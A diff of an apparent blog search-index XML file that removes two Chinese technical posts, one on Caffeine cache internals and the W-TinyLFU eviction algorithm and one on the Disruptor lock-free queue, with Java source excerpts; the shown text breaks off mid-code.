@@ -52,81 +52,6 @@
       </tags>
   </entry>
   <entry>
-    <title>caffeine 缓存实现原理</title>
-    <url>/caffeine.html</url>
-    <content><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>我们知道 HashMap 可以作为进程内缓存，他不受外部系统影响，速度快。但是他不能像分布式缓存那样能够实时刷新，且本地内存有限，需要限定 HashMap 的容量范围，这就涉及到缓存淘汰问题。为了解决本地缓存的这些问题，Guava Cache 应运而生，他提供了异步刷新和 LRU 淘汰策略。Guava Cache 功能虽然强大，但是只是对 LRU 的一层封装，在复杂的业务场景下，LRU 淘汰策略显得力不从心。为此基于  W-TinyLFU(LFU+LRU算法的变种) 淘汰策略的进程内缓存 —— Caffeine Cache 诞生了。</p>
-<p>Caffeine 的设计实现来自于大量优秀的研究，SpringBoot2 和 Spring5 已经默认支持 Caffeine Cache 代替原来的 Guava Cache，足以见得  Caffeine Cache 的地位。</p>
-<p>本文将试着探究 Guava Cache 和 Caffeine Cache 的实现原理，重点讲解 Caffeine Cache 相比于 Guava Cache 有哪些优秀的设计和改动。本文研究的 caffeine 版本是 2.7.0，guava 版本是 27.1-jre。</p>
-<h2 id="二、缓存淘汰算法"><a href="#二、缓存淘汰算法" class="headerlink" title="二、缓存淘汰算法"></a>二、缓存淘汰算法</h2><p>因为本地内存非常有限，我们的进程内缓存必须是有界的，需要进行数据淘汰，将无效的数据驱逐。一个好的淘汰算法，决定了其命中率高低。下面会简单介绍一些常见的淘汰算法，以便于后续的深入讲解。</p>
-<h3 id="2-1-LFU"><a href="#2-1-LFU" class="headerlink" title="2.1 LFU"></a>2.1 LFU</h3><p>LFU（Least Frequently Used，最近最不常用）根据数据的访问频率，淘汰掉最近访问频率最低的数据，其核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。</p>
-<p>需要维护每个数据项的访问频率信息，每次访问都需要更新，这个开销是非常大的。</p>
-<p>LFU 能够很好地应对偶发性、周期性的批量操作，不会造成缓存污染。但是对于突发性的热点事件，比如外卖中午时候访问量突增、微博爆出某明星糗事就是一个突发性热点事件。当事件结束后，可能没有啥访问量了，但是由于其极高的访问频率，导致其在未来很长一段时间内都不会被淘汰掉。</p>
-<h3 id="2-2-LRU"><a href="#2-2-LRU" class="headerlink" title="2.2 LRU"></a>2.2 LRU</h3><p>LRU（Least recently used，最近最少使用）根据数据的访问记录，淘汰掉最近最少使用的数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也更高”（时间局部性原理）。</p>
-<p>需要用 queue 来保存访问记录，可以用 LinkedHashMap 来简单实现一个基于 LRU 算法的缓存。</p>
-<p>当存在热点数据时，LRU的效率很好。但偶发性的、周期性的批量操作会导致LRU命中率急剧下降，缓存污染情况比较严重。</p>
-<h3 id="2-3-TinyLFU"><a href="#2-3-TinyLFU" class="headerlink" title="2.3 TinyLFU"></a>2.3 TinyLFU</h3><p>TinyLFU 顾名思义，轻量级LFU，相比于 LFU 算法用更小的内存空间来记录访问频率。</p>
-<p>TinyLFU 维护了近期访问记录的频率信息，不同于传统的 LFU 维护整个生命周期的访问记录，所以他可以很好地应对突发性的热点事件（超过一定时间，这些记录不再被维护）。这些访问记录会作为一个过滤器，当新加入的记录（New Item）访问频率高于将被淘汰的缓存记录（Cache Victim）时才会被替换。流程如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio7.svg?sanitize=true" alt="08c4cfb4641549d3fb651df6d21425c7.png"></p>
-<p>尽管维护的是近期的访问记录，但仍然是非常昂贵的，TinyLFU 通过 Count-Min Sketch 算法来记录频率信息，它占用空间小且误报率低，关于 Count-Min Sketch 算法可以参考论文：<a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">pproximating Data with the Count-Min Data Structure</a></p>
-<h3 id="2-4-W-TinyLFU"><a href="#2-4-W-TinyLFU" class="headerlink" title="2.4 W-TinyLFU"></a>2.4 W-TinyLFU</h3><p>W-TinyLFU 算法相比于 LRU 等算法，具有更高的命中率。下图是一个运行了 ERP 应用的数据库服务中各种算法的命中率，实验数据来源于 ARC 算法作者，更多场景的性能测试参见：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency">官网</a></p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/66CBD80A-A07E-48CC-8CA8-19FE4ED688FB.png" alt="fc0df0eba9c3b7485b30d498559d98ac.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Efficiency%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Efficiency）</a></p>
-<p>W-TinyLFU 算法是对 TinyLFU算法的优化，能够很好地解决一些稀疏的突发访问元素。在一些数目很少但突发访问量很大的场景下，TinyLFU将无法保存这类元素，因为它们无法在短时间内积累到足够高的频率，从而被过滤器过滤掉。W-TinyLFU 将新记录暂时放入 Window Cache 里面，只有通过 TinLFU 考察才能进入 Main Cache。大致流程如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio8.svg?sanitize=true" alt="394b28c7e161703b4630108f894f9ece.png"></p>
-<h2 id="三、缓存事务"><a href="#三、缓存事务" class="headerlink" title="三、缓存事务"></a>三、缓存事务</h2><p>为了实现缓存的过期策略，我们需要在访问数据的时候记录一系列信息，我们将该操作定义为<strong>缓存事务</strong>。</p>
-<p>对于一个实现了写后过期的缓存，需要在其 put 操作时，记录 entry 的写时间，后续通过这个 entry 写时间来判断其是否过期。对于一个实现了读后过期的缓存，需要在其 get 操作时记录 entry 的最后访问时间，后续通过 entry 的最后访问时间来判断其是否过期。对于一个实现了 LFU 淘汰策略的缓存，需要在每次 get 操作时记录 entry 的访问次数，后续通过 entry 的访问次数来判断其是否淘汰。为了便于后续的表述，对于这种为实现缓存的过期淘汰策略而做的一系列额外操作，我们将其定义为<strong>缓存事务</strong>。</p>
-<h2 id="四、guava-缓存"><a href="#四、guava-缓存" class="headerlink" title="四、guava 缓存"></a>四、guava 缓存</h2><p>guava 缓存提供了基于容量、时间、引用的过期策略。基于容量的实现是采用 LRU 算法。基于引用的实现是借助于 JVM GC，因为缓存的key被封装在WeakReference引用内，缓存的Value被封装在WeakReference或SoftReference引用内。</p>
-<p>为了减少读写缓存的并发问题，参考了 JDK1.7 版本的 ConcurrentHashMap，实现了分段锁机制来减少锁粒度。然而分段锁机制不是非常好的方案，JDK1.8 已经取消了 ConcurrentHashMap 的分段锁，采用的 CAS + synchronized，他只锁住数组的单个元素。关于 ConcurrentHashMap 在 JDK1.8  中的改进，这里不再展开。</p>
-<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。其中 recencyQueue 是记录 get 操作命中的，accessQueue 是记录 get 操作未命中的。recencyQueue 是无锁操作，需要保证线程安全。  值得注意的是，在高并发下，queue的竞争是比较激烈，guava 是在 每个 put/get 操作时记录到对应的 queue，这样增加了用户端的耗时。</p>
-<p>过期策略是在访问数据的时候，判断是否过期。这样做好处是不需要后台线程定期扫描，但增加了耗时和内存损耗（本该过期的数据没有及时过期）。</p>
-<h3 id="4-1-Guava-缓存的执行流程"><a href="#4-1-Guava-缓存的执行流程" class="headerlink" title="4.1 Guava 缓存的执行流程"></a>4.1 Guava 缓存的执行流程</h3><p>guava 的事务操作是在读取缓存时一起执行的，读取缓存操作流程如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio9.svg?sanitize=true" alt="ec637600e0c6833c9b23076f48e3487a.png"></p>
-<p>事务处理在读取缓存时同步进行，这样的好处是不需要后台线程定期扫描处理事务，保证数据的实时性，但会增加一定的耗时。</p>
-<h3 id="4-2-Guava-缓存中的事务处理"><a href="#4-2-Guava-缓存中的事务处理" class="headerlink" title="4.2 Guava 缓存中的事务处理"></a>4.2 Guava 缓存中的事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio10.svg?sanitize=true" alt="bbd76bb898c0e572a12de5d4ba0c2c37.png"></p>
-<p>采用 LRU 过期策略，每个 Segment 维护三个 queue，writeQueue 、 accessQueue和recencyQueue。用来实现不同情况的 LRU 淘汰策略。其中 recencyQueue 是<strong>记录 get 命中操作的</strong>，这是个多线程操作，Guava 通过线程安全的 recencyQueue 来记录，然后通过单线程批量 recencyQueue 将访问记录添加到非线程安全的 accessQueue，可以看出 recencyQueue <strong>起到缓冲的作用</strong>。  正因为 recencyQueue 是线程安全的，在 get 操作时又增加了并发竞争耗时（将 Entry 添加到 recencyQueue）。</p>
-<h2 id="五、caffeine-缓存"><a href="#五、caffeine-缓存" class="headerlink" title="五、caffeine 缓存"></a>五、caffeine 缓存</h2><p>相比于 Guava 缓存，采用了更加先进的过期策略 W-TinyLFU，通过 RingBuffer 缓存事务，并用后台进程批量处理事务。Caffeine 直接采用的是 ConcurrentHashMap，要知道 ConcurrentHashMap 在 JDK1.8 是有非常大的性能提升的。</p>
-<p>简单讲，Caffeine 是对 ConcurrentHashMap 进行封装，采用缓冲和后台线程批量处理事务，Caffeine 官方称其并发性能近视等于 ConcurrentHashMap。</p>
-<p>Caffeine 官方做了性能测试，其中 6 线程读 2 线程写吞吐量如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/7B9BF947-6252-46E6-B0B5-77DE828AD6FE.png" alt="f9487f4ff3617d4f5c8c80f3186cf8e8.png"><br>（图片来源于：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks%EF%BC%89">https://github.com/ben-manes/caffeine/wiki/Benchmarks）</a></p>
-<p>可以看到 Caffeine 缓存吞吐量远超 Guava 缓存，其余场景性能测试详见：<a href="https://github.com/ben-manes/caffeine/wiki/Benchmarks">官网</a></p>
-<h3 id="5-1-基于-W-TinyLFU"><a href="#5-1-基于-W-TinyLFU" class="headerlink" title="5.1 基于 W-TinyLFU"></a>5.1 基于 W-TinyLFU</h3><p>前面已经提到了 W-TinyLFU 算法，Caffeine 采用 W-TinyLFU 算法来实现其淘汰策略。Caffeine 内部维护了三个 queue，分别为：</p>
-<ul>
-<li>access order queue，实现读后过期</li>
-<li>write order queue，实现写后过期</li>
-<li>Hierarchical TimerWheel，实现定时过期</li>
-</ul>
-<p>在大多数情况下，读操作远比写操作多，因此 Caffeine 为了提高读并发能力，采用分段策略，将 access order queue 分为三种，分别是 WindowDeque、ProbationDeque、ProtectedDeque。这三者关系如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio11.svg?sanitize=true" alt="d5044eb799b261357b0a4ce8f762989b.png"></p>
-<p>结合 W-TinyLFU 算法，可以得出记录从产生到淘汰的整个流程：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/57F8E049-C5CE-4538-A6C0-9F9D071D7BF7.png" alt="f575ccd5c3ee35ca692a41ee0faa5505.png"><br>（图片来源于：<a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html%EF%BC%89">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html）</a></p>
-<p>新的记录会进入第一个 LRU，这个在 Caffeine 里是 WindowDeque。之后通过过滤器过滤，过滤器通过访问频率来实现过滤，只有高于将要淘汰数据的使用频率才能进入缓存。这个频率信息维护就是前面提到的 Count-Min Sketch 算法来实现的，具体是 FrequencySketch 类。</p>
-<h4 id="5-1-1-过期策略"><a href="#5-1-1-过期策略" class="headerlink" title="5.1.1 过期策略"></a>5.1.1 过期策略</h4><p>Caffeine 采用统一的过期时间，这样可以实现 O(1) 复杂度往队列里添加和取出记录。对于写后过期，维护一个写入顺序队列，对于读后过期，维护一个读顺序队列。值得注意的是，这些操作都是单线程异步执行的。</p>
-<h3 id="5-2-执行流程"><a href="#5-2-执行流程" class="headerlink" title="5.2 执行流程"></a>5.2 执行流程</h3><p>与 Guava 最大的不同就是，Caffeine 在读取缓存操作时，将<strong>事务提交到缓存异步批量处理</strong>，大致处理流程如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio12.svg?sanitize=true" alt="a90c9c637a6b76cf46f13d01815bcd86.png"></p>
-<h3 id="5-3-缓存区"><a href="#5-3-缓存区" class="headerlink" title="5.3 缓存区"></a>5.3 缓存区</h3><h4 id="5-3-1-readBuffer"><a href="#5-3-1-readBuffer" class="headerlink" title="5.3.1 readBuffer"></a>5.3.1 readBuffer</h4><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio13.svg?sanitize=true" alt="36ba91e8ba3b79918b10cdf7b9d17082.png"></p>
-<p>采用RingBuffer，有损。为了进一步减少读并发，采用多个 RingBuffer（striped ring buffer 条带环形缓冲），通过线程 id 哈希到对应的RingBuffer。环形缓存的一个显著特点是不需要进行 GC，直接通过覆盖过期数据。</p>
-<p>当一个 RingBuffer 容量满载后，会触发异步的执行操作，而后续的对该 ring buffer 的写入会被丢弃，直到这个 ring buffer 可被使用，因此 readBuffer 记录读缓存事务是有损的。因为读记录是为了优化驱策策略，允许他有损。</p>
-<h4 id="5-3-2-writeBuffer"><a href="#5-3-2-writeBuffer" class="headerlink" title="5.3.2 writeBuffer"></a>5.3.2 writeBuffer</h4><p>采用传统的有界队列 ArrayQueue，无损</p>
-<h3 id="5-4-状态机"><a href="#5-4-状态机" class="headerlink" title="5.4 状态机"></a>5.4 状态机</h3><p>缓冲区和细粒度的写带来了单个数据项的操作乱序的竞态条件。插入、读取、更新、删除都可能被各种顺序的重放，如果这个策略控制的不合适，则可能引起悬垂索引。解决方案是通过状态机来定义单个数据项的生命周期。这类似于 AQS 中的原子类型变量 state。</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio14.svg?sanitize=true" alt="7744cc0f1faa13cb71a53c2033fe495c.png"></p>
-<h3 id="5-5-事务处理"><a href="#5-5-事务处理" class="headerlink" title="5.5 事务处理"></a>5.5 事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio15.svg?sanitize=true" alt="4aa939e0c2bfc37f2463823eeeca80d7.png"></p>
-<h3 id="5-6-caffeine-get-操作流程图"><a href="#5-6-caffeine-get-操作流程图" class="headerlink" title="5.6 caffeine get 操作流程图"></a>5.6 caffeine get 操作流程图</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio16.svg?sanitize=true" alt="f07e7f28159908d5899cb36643be3c46.png"></p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio17.svg?sanitize=true" alt="4fe5bac0356b7e0baf8f181938b1bcde.png"></p>
-<h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><p><a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html</a></p>
-<p><a href="https://github.com/ben-manes/caffeine">https://github.com/ben-manes/caffeine</a></p>
-<p><a href="https://arxiv.org/pdf/1512.00727.pdf">TinyLFU: A Highly Eﬃcient Cache Admission Policy</a></p>
-<p><a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">Approximating Data with the Count-Min Data Structure</a></p>
-<p><a href="https://segmentfault.com/a/1190000016091569">https://segmentfault.com/a/1190000016091569</a></p>
-<p><a href="https://chuansongme.com/n/2254051">https://chuansongme.com/n/2254051</a></p>
-]]></content>
-      <categories>
-        <category>javaWeb</category>
-      </categories>
-      <tags>
-        <tag>源码</tag>
-        <tag>caffeine</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ddd-overview</title>
     <url>/ddd-overview.html</url>
     <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>领域驱动设计（Domain-Driven Design，简称DDD）起源于2004年Eric Evans出版《领域驱动设计》，用于应对复杂需求的软件开发。随着近几年微服务架构的普及，DDD 又火起来了</p>
@@ -212,65 +137,96 @@
       </tags>
   </entry>
   <entry>
-    <title>disrupt 实现原理</title>
-    <url>/disrupt.html</url>
-    <content><![CDATA[<h2 id="一、Disruptor-简介"><a href="#一、Disruptor-简介" class="headerlink" title="一、Disruptor 简介"></a>一、Disruptor 简介</h2><p>线程间通讯框架，实现多线程共享数据。是一个高性能无锁队列，由英国外汇交易公司 LMAX 开发。</p>
-<p>性能测试：<a href="https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results">https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results</a></p>
-<span id="more"></span>
-
-<h2 id="二、Disruptor-为什么这么快"><a href="#二、Disruptor-为什么这么快" class="headerlink" title="二、Disruptor 为什么这么快"></a>二、Disruptor 为什么这么快</h2><h3 id="2-1-无锁操作"><a href="#2-1-无锁操作" class="headerlink" title="2.1 无锁操作"></a>2.1 无锁操作</h3><p>生产数据消费数据都是通过申请序列，申请成功后才可以继续操作。而申请序列的操作时通过 CAS + LockSupport 完成的。</p>
-<h3 id="2-2-消除伪共享"><a href="#2-2-消除伪共享" class="headerlink" title="2.2 消除伪共享"></a>2.2 消除伪共享</h3><p>通过填充数据方式来实现消除伪共享</p>
-<h4 id="2-2-1-什么是伪共享"><a href="#2-2-1-什么是伪共享" class="headerlink" title="2.2.1 什么是伪共享"></a>2.2.1 什么是伪共享</h4><p>cpu 三级缓存架构如下</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor.png" alt="cpu 三级缓存"></p>
-<p>thread1 和 thread2 读取数据会覆盖 cpu cache line</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor1.png" alt="伪共享"></p>
-<h4 id="2-2-2-通过数据填充消除伪共享"><a href="#2-2-2-通过数据填充消除伪共享" class="headerlink" title="2.2.2 通过数据填充消除伪共享"></a>2.2.2 通过数据填充消除伪共享</h4><p>通过填充数据，使数据长度恰好等于一个缓存行长度（64 字节 or 128 字节），这样数据占据整个缓存行，就不会被别的数据覆盖。</p>
-<p>Disruptor 中的 Sequence 序列号对象，通过先后数据填充，变为 128 个字节，实现伪共享消除的。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p1, p2, p3, p4, p5, p6, p7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> <span class="keyword">extends</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RhsPadding</span> <span class="keyword">extends</span> <span class="title">Value</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p9, p10, p11, p12, p13, p14, p15;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sequence</span> <span class="keyword">extends</span> <span class="title">RhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> INITIAL_VALUE = -<span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe UNSAFE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> VALUE_OFFSET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过前置p1<del>p7，后置p9</del>p15填充缓存行，防止缓冲行共享。一般的处理器架构缓存行是64字节，但是有个处理器架构是128字节，所以采用前后填充，能够实现在所有处理器上消除伪共享。</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor2.png" alt="缓存行"></p>
-<h3 id="2-3-环形-buffer"><a href="#2-3-环形-buffer" class="headerlink" title="2.3 环形 buffer"></a>2.3 环形 buffer</h3><p>内部采用数组存储数据，充分利用内存局部性原理。</p>
-<p>只使用一个指针来表示可用数据，没有头尾指针。消除头尾指针竞争。各个生产者消费者只需要申请自己的序列号，就可以进行操作了。不存在竞争同一资源。</p>
-<p>bufferSize 是 2 的 n 次幂，通过 sequence &amp; (2^n -1) 来计算索引。</p>
-<p>通过数据覆盖，不需要删除数据，无需 GC。</p>
-<h2 id="三、Disruptor-如何工作"><a href="#三、Disruptor-如何工作" class="headerlink" title="三、Disruptor 如何工作"></a>三、Disruptor 如何工作</h2><h3 id="3-1-消费者端"><a href="#3-1-消费者端" class="headerlink" title="3.1 消费者端"></a>3.1 消费者端</h3><p>每个消费者都对应一个 ConsumerBarrier，消费者通过 ConsumerBarrier 与 Disruptor 交互。消费者通过 ConsumerBarrier 获取下一个可以消费的序列号，然后开始消费。比如消费者 A 当前消费的序列号是8，通过 ConsumerBarrier 获取下一个可消费的序列号是 12，那么消费者 A 可以批量消费序列号 9，10，11，12 的数据。</p>
-<p><strong>消费者消费数据步骤：1.获取序列号，2.消费数据</strong></p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor3.png" alt="消费者消费步骤"></p>
-<h3 id="3-2-生产者端"><a href="#3-2-生产者端" class="headerlink" title="3.2 生产者端"></a>3.2 生产者端</h3><p>多个生产者对应一个 Sequencer，也就是说多个生产者共用一个序列号。</p>
-<p><strong>生产者生产数据步骤：1.申请序列号，2.填充数据，3.发布</strong></p>
-<p>生产者 A 和生产者 B <strong>同时生产</strong>数据，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor4.png" alt="生产者1"></p>
-<p>生产者 A <strong>讯轮阻塞</strong> 等待消费者 A，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor5.png" alt="生产者2"></p>
-<p>消费者 A <strong>轮训非阻塞</strong> 等待生产者 B，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor6.png" alt="生产者3"></p>
-<h2 id="四、源码导读"><a href="#四、源码导读" class="headerlink" title="四、源码导读"></a>四、源码导读</h2><h3 id="4-1-核心类"><a href="#4-1-核心类" class="headerlink" title="4.1 核心类"></a>4.1 核心类</h3><p><a href="https://github.com/LMAX-Exchange/disruptor/wiki/Introduction">https://github.com/LMAX-Exchange/disruptor/wiki/Introduction</a></p>
-<p>ringbuff上有指针，每个消费者都维护自己的一个指针，生产者共用一个指针。指针是由 Sequencer类来控制的假设buffsize=8，如果消费者在消费id7，生产者将生产id15（15-buffsize=7），是同一个位置，生产者阻塞，如果生产者在生产id7，消费者在消费id7，消费者阻塞</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/162762019.png" alt="流程图"></p>
-<h3 id="4-2-生产者端"><a href="#4-2-生产者端" class="headerlink" title="4.2 生产者端"></a>4.2 生产者端</h3><h4 id="4-2-1-申请序号"><a href="#4-2-1-申请序号" class="headerlink" title="4.2.1 申请序号"></a>4.2.1 申请序号</h4><p>调用 Sequencer#get ，直接看多生产者如果申请序号的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;n must be &gt; 0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> current;</span><br><span class="line">  <span class="keyword">long</span> next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取当前发布序号</span></span><br><span class="line">    current = cursor.get();</span><br><span class="line">    next = current + n;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">long</span> wrapPoint = next - bufferSize;</span><br><span class="line">    <span class="comment">// gatingSequenceCache 这是 gatingSequence 的缓存，存入的是最小的消费者消费序列（有多个消费者）</span></span><br><span class="line">    <span class="keyword">long</span> cachedGatingSequence = gatingSequenceCache.get();</span><br><span class="line">		<span class="comment">// 生产者要覆盖未被消费的数据（生产者超过消费者一圈了）</span></span><br><span class="line">    <span class="keyword">if</span> (wrapPoint &gt; cachedGatingSequence || cachedGatingSequence &gt; current)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获取最小的消费者序列</span></span><br><span class="line">      <span class="keyword">long</span> gatingSequence = Util.getMinimumSequence(gatingSequences, current);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wrapPoint &gt; gatingSequence)</span><br><span class="line">      &#123;</span><br><span class="line">        LockSupport.parkNanos(<span class="number">1</span>); <span class="comment">// TODO, should we spin based on the wait strategy?</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">			<span class="comment">// 更新缓存</span></span><br><span class="line">      gatingSequenceCache.set(gatingSequence);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cursor.compareAndSet(current, next))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-2-2-写入数据"><a href="#4-2-2-写入数据" class="headerlink" title="4.2.2 写入数据"></a>4.2.2 写入数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> (E)entries[(<span class="keyword">int</span>)sequence &amp; indexMask];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// dosomething</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="4-2-3发布"><a href="#4-2-3发布" class="headerlink" title="4.2.3发布"></a>4.2.3发布</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publish</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 将待发布的序列设为可用，这样消费者就可以消费这个序列了</span></span><br><span class="line">  setAvailable(sequence);</span><br><span class="line">  waitStrategy.signalAllWhenBlocking();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-消费者端"><a href="#4-3-消费者端" class="headerlink" title="4.3 消费者端"></a>4.3 消费者端</h3><p>Disruptor#start 启动，会在线程池里启动 EventProcessor，每个 EventHandler 对应一个 EventProcessor</p>
-<p>BatchEventProcessor 是 EventProcessor 的实现类，run方法里会轮训，是否有 event 可以被消费，如果可以就调用 EventHandler#onEvent 方法，触发消费者事件。</p>
-<p>重点看 BatchEventProcessor#run 方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 状态设为启动，是一个AtomicBoolean</span></span><br><span class="line">  <span class="keyword">if</span> (!running.compareAndSet(<span class="keyword">false</span>, <span class="keyword">true</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Thread is already running&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 清除中断</span></span><br><span class="line">  sequenceBarrier.clearAlert();</span><br><span class="line">	<span class="comment">// 判断一下消费者是否实现了LifecycleAware ,如果实现了这个接口，那么此时会发送一个启动通知</span></span><br><span class="line">  notifyStart();</span><br><span class="line"></span><br><span class="line">  T event = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">long</span> nextSequence = sequence.get() + <span class="number">1L</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 获取最大可用的序号，表示在之前的都可以安全消费</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> availableSequence = sequenceBarrier.waitFor(nextSequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (nextSequence &lt;= availableSequence)</span><br><span class="line">        &#123;</span><br><span class="line">          event = dataProvider.get(nextSequence);</span><br><span class="line">          eventHandler.onEvent(event, nextSequence, nextSequence == availableSequence);</span><br><span class="line">          nextSequence++;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 记录对应消费者消费到哪里</span></span><br><span class="line">        sequence.set(availableSequence);</span><br><span class="line">      &#125;</span><br><span class="line">      